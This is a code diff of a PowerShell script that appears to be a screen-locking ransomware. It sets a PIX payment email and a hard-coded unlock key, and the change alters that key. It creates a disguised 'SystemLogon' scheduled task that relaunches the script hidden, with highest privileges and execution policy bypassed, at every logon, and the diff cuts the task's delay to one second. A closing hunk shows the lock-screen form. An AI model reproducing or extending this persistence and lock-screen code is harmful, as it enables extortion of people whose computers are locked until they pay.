@@ -14,13 +14,13 @@ public class User32 {
 $screenTaskName = "SystemLogon"
 $scriptPath = [System.IO.Path]::GetFullPath($PSCommandPath)
 $pixKey = "keyzer0reis@gmail.com"
-$correctKey = "1"
+$correctKey = "#pix220c#"
 
 # Função para criar tarefa agendada
 function Create-StartupTask {
     $taskExists = schtasks /query /tn $screenTaskName 2>$null
     if ($? -eq $false) {
-        $cmd = "schtasks /create /tn `"$screenTaskName`" /sc onlogon /rl highest /f /tr `"powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File '$scriptPath'`" /delay 0001:00"
+        $cmd = "schtasks /create /tn `"$screenTaskName`" /sc onlogon /rl highest /f /tr `"powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File '$scriptPath'`" /delay 0000:01"
         Invoke-Expression $cmd | Out-Null
     }
 }
@@ -170,3 +170,4 @@ $textbox.Add_KeyDown({
 $form.Add_Shown({ $textbox.Focus() })
 
 [void]$form.ShowDialog()
+
